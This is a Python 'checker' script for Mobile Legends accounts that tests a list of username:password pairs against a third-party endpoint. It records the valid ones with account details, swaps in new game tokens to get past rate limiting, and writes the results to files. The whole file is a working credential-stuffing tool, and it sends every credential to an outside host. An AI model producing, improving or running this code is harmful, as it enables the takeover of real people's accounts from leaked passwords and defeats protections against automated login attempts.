import requests
import time
import os
from datetime import datetime
from termcolor import colored
from colorama import Fore, Style, init




success_count = 0
fail_count = 0

def check_account(user, pw, game_token):
    global success_count, fail_count
    try:
        resp = requests.get(
            "https://suneoxjarell.x10.bz/moonton_api.php",
            params={"user": user, "pw": pw, "token": game_token}
        )
        data = resp.json()

        if data["status"] == "valid":
            result = (
                f"[+] [VALID] [{user}:{pw}]\n"
                f"    ├─ IGN   : {data['name']}\n"
                f"    ├─ Level       : {data['level']}\n"
                f"    ├─ Rank  : {data['rank']}\n"
                f"    ├─ Region      : {data['region']}\n"
                f"    ├─ Id/server    : {data['role_id']} ({data['zone_id']})\n"
                f"    ├─ Avatar      : {data['avatar']}\n"
                f"    └─ Dropped by : @Pogigg2"
            )
            print(result)
            success_count += 1
            with open("valid.txt", "a") as f:
                f.write(result + "\n")
        elif data["reason"] == "error_too_many_attempts":
            handle_failed_account(user, pw)
            return check_account(user, pw, read_new_game_token())  # Retry with new token
        else:
            result = f"[-] [INVALID] [{user}:{pw}] [{data['reason']}]"
            print(result)
            fail_count += 1
            with open("invalid.txt", "a") as f:
                f.write(result + "\n")
    except Exception as e:
        result = f"[-] [ERROR] [{user}:{pw}] [{str(e)}]"
        print(result)
        fail_count += 1
        with open("invalid.txt", "a") as f:
            f.write(result + "\n")

def handle_failed_account(user, pw):
    with open("too_many.txt", "a") as f:
        f.write(f"{user}:{pw}\n")
    print(f"[-] Account {user} has failed too many times. Saved.")

def read_new_game_token():
    while True:
        try:
            with open("gametoken.txt", "r") as f:
                token = f.readline().strip()
            if token:
                print(f"[+] New game token found: {token}")
                return token
            else:
                print("[*] No token found, waiting...")
        except FileNotFoundError:
            print("[!] gametoken.txt not found.")
        time.sleep(5)

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def display_banner():
    print(colored(" [+] MLBB CHECKER FULL INFO BY TAIZOU\n", "yellow", attrs=["bold"]))


# Start
clear_screen()
display_banner()

# Update to reflect your "TAIZOU" branding
TAIZOU_LOGO = """

           SARAP KO LUDSSS
██████████████████████████████████████
█▌**********************************▐█
█▌**********************************▐█
█▌**********************************▐█
█▌**********************************▐█
█▌**********************************▐█
█▌*****░▀█▀░█▀█░▀█▀░▀▀█░█▀█░█░█*****▐█
█▌*****░░█░░█▀█░░█░░▄▀░░█░█░█░█*****▐█
█▌*****░░▀░░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀▀▀*****▐█
█▌**********************************▐█
█▌**********************************▐█
█▌**********************************▐█
█▌**********************************▐█
█▌**********************************▐█
██████████████████████████████████████
         TAIZOU MASARAP
        
   TAIZOU MOBILE LEGENDS CHECKER⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

print(colored(TAIZOU_LOGO, "red", attrs=["bold"]))
print(colored("            Made by Taizou\n", "yellow", attrs=["bold"]))


input_path = input("Enter the full path to your .txt file: ").strip()
game_token = input("Enter starting game token: ").strip()

try:
    with open(input_path, "r") as f:
        for line in f:
            if ":" in line:
                user, pw = line.strip().split(":", 1)
                check_account(user, pw, game_token)
                time.sleep(1)
            else:
                print(f"Invalid format: {line}")
                with open("invalid.txt", "a") as inv_f:
                    inv_f.write(f"{line} => Invalid format\n")
except FileNotFoundError:
    print("File not found.")
except KeyboardInterrupt:
    print("\n[!] Stopped by user. Exiting.")

# Output totals
print("\nS")
print(f"Failed total  : {fail_count}")
print(f"Success total : {success_count}")